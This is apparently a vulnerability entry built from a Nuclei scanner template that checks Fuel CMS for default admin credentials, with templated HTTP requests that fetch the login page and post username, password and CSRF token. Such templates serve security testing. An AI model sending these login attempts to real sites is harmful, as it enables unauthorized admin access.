# Vulnerability: Fuel CMS - Default Admin Discovery
**Classification:** CWE-522
**Source:** Nuclei Template (`fuelcms-default-login.yaml`)

## Description
Fuel CMS default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /fuel/login HTTP/1.1
Host: {{Hostname}}

POST /fuel/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user_name={{username}}&password={{password}}&Login=Login&forward=&ci_csrf_token_FUEL={{csrftoken}}
```

